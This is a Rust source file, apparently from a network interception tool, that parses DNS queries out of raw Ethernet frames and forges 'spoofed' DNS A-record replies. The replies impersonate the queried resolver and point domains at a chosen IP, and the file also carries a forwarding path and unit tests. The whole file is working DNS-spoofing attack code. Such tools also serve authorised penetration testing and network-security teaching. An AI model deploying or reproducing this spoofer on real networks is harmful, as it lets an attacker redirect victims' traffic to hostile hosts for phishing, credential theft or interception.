use std::net::Ipv4Addr;

use pnet::datalink::MacAddr;
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{self, Ipv4Packet, MutableIpv4Packet};
use pnet::packet::udp::{self, MutableUdpPacket, UdpPacket};
use pnet::packet::{MutablePacket, Packet};

const ETHERNET_HEADER_SIZE: usize = 14;
const IPV4_HEADER_SIZE: usize = 20;
const UDP_HEADER_SIZE: usize = 8;
const DNS_HEADER_SIZE: usize = 12;

/// Maximum buffer size for a DNS response frame.
pub const MAX_FRAME_SIZE: usize = 1514;

/// A parsed DNS query extracted from a raw Ethernet frame.
#[derive(Debug, Clone)]
pub struct DnsQuery {
    pub src_mac: MacAddr,
    pub src_ip: Ipv4Addr,
    pub src_port: u16,
    pub dst_ip: Ipv4Addr,
    pub tx_id: u16,
    pub domain: String,
    pub question: Vec<u8>,
    pub dns_payload: Vec<u8>,
}

/// Parse an Ethernet frame containing a DNS query (UDP port 53).
pub fn parse_query(frame: &[u8]) -> Option<DnsQuery> {
    let eth = EthernetPacket::new(frame)?;
    if eth.get_ethertype() != EtherTypes::Ipv4 {
        return None;
    }

    let ipv4 = Ipv4Packet::new(eth.payload())?;
    if ipv4.get_next_level_protocol() != IpNextHeaderProtocols::Udp {
        return None;
    }

    let udp = UdpPacket::new(ipv4.payload())?;
    if udp.get_destination() != 53 {
        return None;
    }

    let dns_payload = udp.payload();
    if dns_payload.len() < DNS_HEADER_SIZE {
        return None;
    }

    // Check QR bit = 0 (query) and QDCOUNT >= 1
    let flags = u16::from_be_bytes([dns_payload[2], dns_payload[3]]);
    if flags & 0x8000 != 0 {
        return None; // response, not query
    }
    let qdcount = u16::from_be_bytes([dns_payload[4], dns_payload[5]]);
    if qdcount == 0 {
        return None;
    }

    let tx_id = u16::from_be_bytes([dns_payload[0], dns_payload[1]]);

    let (domain, name_end) = decode_domain_name(&dns_payload[DNS_HEADER_SIZE..])?;

    // question section = name + QTYPE(2) + QCLASS(2)
    let q_start = DNS_HEADER_SIZE;
    let q_end = q_start + name_end + 4;
    if q_end > dns_payload.len() {
        return None;
    }
    let question = dns_payload[q_start..q_end].to_vec();

    Some(DnsQuery {
        src_mac: eth.get_source(),
        src_ip: ipv4.get_source(),
        src_port: udp.get_source(),
        dst_ip: ipv4.get_destination(),
        tx_id,
        domain,
        question,
        dns_payload: dns_payload.to_vec(),
    })
}

/// Build a spoofed DNS A-record response frame.
///
/// Returns the total frame size written into `buf`.
pub fn build_response(
    buf: &mut [u8],
    query: &DnsQuery,
    responder_mac: MacAddr,
    spoofed_ip: Ipv4Addr,
) -> usize {
    let dns_payload = encode_dns_answer(query.tx_id, &query.question, spoofed_ip);
    write_headers(buf, query, responder_mac, &dns_payload)
}

/// Build a DNS response frame wrapping an upstream DNS payload.
///
/// Returns the total frame size written into `buf`.
pub fn build_forwarded_response(
    buf: &mut [u8],
    query: &DnsQuery,
    responder_mac: MacAddr,
    dns_payload: &[u8],
) -> usize {
    write_headers(buf, query, responder_mac, dns_payload)
}

/// Check if `queried` matches `rule` — exact or subdomain, case-insensitive.
pub fn matches_domain(queried: &str, rule: &str) -> bool {
    let q = queried.to_ascii_lowercase();
    let r = rule.to_ascii_lowercase();

    if q == r {
        return true;
    }

    // subdomain match: queried ends with ".rule"
    q.ends_with(&format!(".{r}"))
}

/// Decode a DNS-encoded domain name from the start of `data`.
///
/// Returns `(domain_string, bytes_consumed)`.
fn decode_domain_name(data: &[u8]) -> Option<(String, usize)> {
    let mut labels = Vec::new();
    let mut pos = 0;

    loop {
        if pos >= data.len() {
            return None;
        }
        let len = data[pos] as usize;
        if len == 0 {
            pos += 1;
            break;
        }
        // Reject compression pointers — we only handle simple queries.
        if len & 0xC0 != 0 {
            return None;
        }
        pos += 1;
        if pos + len > data.len() {
            return None;
        }
        let label = std::str::from_utf8(&data[pos..pos + len]).ok()?;
        labels.push(label.to_string());
        pos += len;
    }

    if labels.is_empty() {
        return None;
    }

    Some((labels.join("."), pos))
}

/// Encode a minimal DNS response with a single A record.
fn encode_dns_answer(tx_id: u16, question: &[u8], ip: Ipv4Addr) -> Vec<u8> {
    let mut dns = Vec::with_capacity(DNS_HEADER_SIZE + question.len() + 16);

    // Header
    dns.extend_from_slice(&tx_id.to_be_bytes());
    dns.extend_from_slice(&0x8180u16.to_be_bytes()); // QR=1, RD=1, RA=1
    dns.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT=1
    dns.extend_from_slice(&1u16.to_be_bytes()); // ANCOUNT=1
    dns.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT=0
    dns.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT=0

    // Question section (echoed)
    dns.extend_from_slice(question);

    // Answer: name pointer + A record
    dns.extend_from_slice(&0xC00Cu16.to_be_bytes()); // pointer to name in question
    dns.extend_from_slice(&1u16.to_be_bytes()); // TYPE=A
    dns.extend_from_slice(&1u16.to_be_bytes()); // CLASS=IN
    dns.extend_from_slice(&300u32.to_be_bytes()); // TTL=300s
    dns.extend_from_slice(&4u16.to_be_bytes()); // RDLENGTH=4
    dns.extend_from_slice(&ip.octets());

    dns
}

/// Write Ethernet + IPv4 + UDP headers around a DNS payload.
///
/// Returns total frame size.
fn write_headers(
    buf: &mut [u8],
    query: &DnsQuery,
    responder_mac: MacAddr,
    dns_payload: &[u8],
) -> usize {
    let udp_len = UDP_HEADER_SIZE + dns_payload.len();
    let ipv4_len = IPV4_HEADER_SIZE + udp_len;
    let total = ETHERNET_HEADER_SIZE + ipv4_len;

    assert!(
        buf.len() >= total,
        "buffer too small: need {total}, got {}",
        buf.len()
    );

    // Ethernet
    {
        let mut eth = MutableEthernetPacket::new(&mut buf[..ETHERNET_HEADER_SIZE + ipv4_len])
            .expect("buffer too small for Ethernet header");
        eth.set_source(responder_mac);
        eth.set_destination(query.src_mac);
        eth.set_ethertype(EtherTypes::Ipv4);
    }

    // IPv4
    {
        let ipv4_buf = &mut buf[ETHERNET_HEADER_SIZE..ETHERNET_HEADER_SIZE + ipv4_len];
        let mut ipv4 =
            MutableIpv4Packet::new(ipv4_buf).expect("buffer too small for IPv4 header");
        ipv4.set_version(4);
        ipv4.set_header_length(5);
        ipv4.set_total_length(ipv4_len as u16);
        ipv4.set_ttl(64);
        ipv4.set_next_level_protocol(IpNextHeaderProtocols::Udp);
        ipv4.set_source(query.dst_ip);
        ipv4.set_destination(query.src_ip);
        ipv4.set_checksum(ipv4::checksum(&ipv4.to_immutable()));
    }

    // UDP + DNS payload
    {
        let udp_buf =
            &mut buf[ETHERNET_HEADER_SIZE + IPV4_HEADER_SIZE..ETHERNET_HEADER_SIZE + ipv4_len];
        let mut udp_pkt =
            MutableUdpPacket::new(udp_buf).expect("buffer too small for UDP header");
        udp_pkt.set_source(53);
        udp_pkt.set_destination(query.src_port);
        udp_pkt.set_length(udp_len as u16);
        udp_pkt.payload_mut()[..dns_payload.len()].copy_from_slice(dns_payload);

        // Compute UDP checksum using IPv4 pseudo-header.
        let src = query.dst_ip;
        let dst = query.src_ip;
        let cksum = udp::ipv4_checksum(&udp_pkt.to_immutable(), &src, &dst);
        udp_pkt.set_checksum(cksum);
    }

    total
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn domain_matching_exact() {
        assert!(matches_domain("example.com", "example.com"));
    }

    #[test]
    fn domain_matching_subdomain() {
        assert!(matches_domain("www.example.com", "example.com"));
        assert!(matches_domain("a.b.example.com", "example.com"));
    }

    #[test]
    fn domain_matching_partial_rejection() {
        assert!(!matches_domain("notexample.com", "example.com"));
        assert!(!matches_domain("example.com.evil.com", "example.com"));
    }

    #[test]
    fn domain_matching_case_insensitive() {
        assert!(matches_domain("WWW.Example.COM", "example.com"));
        assert!(matches_domain("example.com", "EXAMPLE.COM"));
    }

    #[test]
    fn decode_simple_domain() {
        // "example.com" encoded: 7 e x a m p l e 3 c o m 0
        let data = [
            7, b'e', b'x', b'a', b'm', b'p', b'l', b'e', 3, b'c', b'o', b'm', 0,
        ];
        let (domain, consumed) = decode_domain_name(&data).unwrap();
        assert_eq!(domain, "example.com");
        assert_eq!(consumed, 13);
    }

    #[test]
    fn decode_rejects_truncated() {
        let data = [7, b'e', b'x'];
        assert!(decode_domain_name(&data).is_none());
    }

    #[test]
    fn decode_rejects_empty() {
        let data = [0];
        assert!(decode_domain_name(&data).is_none());
    }

    #[test]
    fn parse_query_valid() {
        let frame = build_test_dns_query(
            MacAddr(0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff),
            Ipv4Addr::new(192, 168, 1, 100),
            12345,
            Ipv4Addr::new(8, 8, 8, 8),
            "example.com",
        );

        let q = parse_query(&frame).expect("should parse valid DNS query");
        assert_eq!(q.src_ip, Ipv4Addr::new(192, 168, 1, 100));
        assert_eq!(q.dst_ip, Ipv4Addr::new(8, 8, 8, 8));
        assert_eq!(q.src_port, 12345);
        assert_eq!(q.domain, "example.com");
        assert_eq!(q.tx_id, 0xABCD);
    }

    #[test]
    fn parse_query_rejects_non_udp() {
        let mut frame = build_test_dns_query(
            MacAddr(0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff),
            Ipv4Addr::new(192, 168, 1, 100),
            12345,
            Ipv4Addr::new(8, 8, 8, 8),
            "example.com",
        );
        // Change protocol from UDP(17) to TCP(6)
        frame[ETHERNET_HEADER_SIZE + 9] = 6;
        assert!(parse_query(&frame).is_none());
    }

    #[test]
    fn parse_query_rejects_non_port53() {
        let mut frame = build_test_dns_query(
            MacAddr(0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff),
            Ipv4Addr::new(192, 168, 1, 100),
            12345,
            Ipv4Addr::new(8, 8, 8, 8),
            "example.com",
        );
        // Change dst port from 53 to 80
        let udp_offset = ETHERNET_HEADER_SIZE + IPV4_HEADER_SIZE;
        frame[udp_offset + 2] = 0;
        frame[udp_offset + 3] = 80;
        assert!(parse_query(&frame).is_none());
    }

    #[test]
    fn parse_query_rejects_response() {
        let mut frame = build_test_dns_query(
            MacAddr(0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff),
            Ipv4Addr::new(192, 168, 1, 100),
            12345,
            Ipv4Addr::new(8, 8, 8, 8),
            "example.com",
        );
        // Set QR bit = 1 (response)
        let dns_offset = ETHERNET_HEADER_SIZE + IPV4_HEADER_SIZE + UDP_HEADER_SIZE;
        frame[dns_offset + 2] |= 0x80;
        assert!(parse_query(&frame).is_none());
    }

    #[test]
    fn parse_query_rejects_truncated() {
        // Too short to contain DNS header
        let frame = vec![0u8; ETHERNET_HEADER_SIZE + IPV4_HEADER_SIZE + UDP_HEADER_SIZE + 4];
        assert!(parse_query(&frame).is_none());
    }

    #[test]
    fn round_trip_build_response() {
        let frame = build_test_dns_query(
            MacAddr(0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff),
            Ipv4Addr::new(192, 168, 1, 100),
            12345,
            Ipv4Addr::new(8, 8, 8, 8),
            "example.com",
        );
        let query = parse_query(&frame).unwrap();

        let responder_mac = MacAddr(0x11, 0x22, 0x33, 0x44, 0x55, 0x66);
        let spoofed_ip = Ipv4Addr::new(10, 0, 0, 1);

        let mut buf = [0u8; MAX_FRAME_SIZE];
        let size = build_response(&mut buf, &query, responder_mac, spoofed_ip);
        assert!(size > 0);

        // Verify the response frame has correct Ethernet destination
        let eth = EthernetPacket::new(&buf[..size]).unwrap();
        assert_eq!(eth.get_destination(), query.src_mac);
        assert_eq!(eth.get_source(), responder_mac);
    }

    /// Helper: build a raw DNS query frame for testing.
    fn build_test_dns_query(
        src_mac: MacAddr,
        src_ip: Ipv4Addr,
        src_port: u16,
        dst_ip: Ipv4Addr,
        domain: &str,
    ) -> Vec<u8> {
        // Encode domain name
        let mut name = Vec::new();
        for label in domain.split('.') {
            name.push(label.len() as u8);
            name.extend_from_slice(label.as_bytes());
        }
        name.push(0);

        // DNS payload: header + question
        let mut dns = Vec::new();
        dns.extend_from_slice(&0xABCDu16.to_be_bytes()); // TX ID
        dns.extend_from_slice(&0x0100u16.to_be_bytes()); // flags: standard query, RD=1
        dns.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT=1
        dns.extend_from_slice(&0u16.to_be_bytes()); // ANCOUNT=0
        dns.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT=0
        dns.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT=0
        dns.extend_from_slice(&name);
        dns.extend_from_slice(&1u16.to_be_bytes()); // QTYPE=A
        dns.extend_from_slice(&1u16.to_be_bytes()); // QCLASS=IN

        let udp_len = UDP_HEADER_SIZE + dns.len();
        let ipv4_len = IPV4_HEADER_SIZE + udp_len;
        let total = ETHERNET_HEADER_SIZE + ipv4_len;

        let mut buf = vec![0u8; total];

        // Ethernet
        {
            let mut eth = MutableEthernetPacket::new(&mut buf[..total]).unwrap();
            eth.set_source(src_mac);
            eth.set_destination(MacAddr(0xff, 0xff, 0xff, 0xff, 0xff, 0xff));
            eth.set_ethertype(EtherTypes::Ipv4);
        }

        // IPv4
        {
            let ipv4_buf = &mut buf[ETHERNET_HEADER_SIZE..ETHERNET_HEADER_SIZE + ipv4_len];
            let mut ipv4 = MutableIpv4Packet::new(ipv4_buf).unwrap();
            ipv4.set_version(4);
            ipv4.set_header_length(5);
            ipv4.set_total_length(ipv4_len as u16);
            ipv4.set_ttl(64);
            ipv4.set_next_level_protocol(IpNextHeaderProtocols::Udp);
            ipv4.set_source(src_ip);
            ipv4.set_destination(dst_ip);
            ipv4.set_checksum(ipv4::checksum(&ipv4.to_immutable()));
        }

        // UDP
        {
            let udp_buf = &mut buf[ETHERNET_HEADER_SIZE + IPV4_HEADER_SIZE..total];
            let mut udp_pkt = MutableUdpPacket::new(udp_buf).unwrap();
            udp_pkt.set_source(src_port);
            udp_pkt.set_destination(53);
            udp_pkt.set_length(udp_len as u16);
            udp_pkt.payload_mut()[..dns.len()].copy_from_slice(&dns);
            let cksum = udp::ipv4_checksum(&udp_pkt.to_immutable(), &src_ip, &dst_ip);
            udp_pkt.set_checksum(cksum);
        }

        buf
    }
}
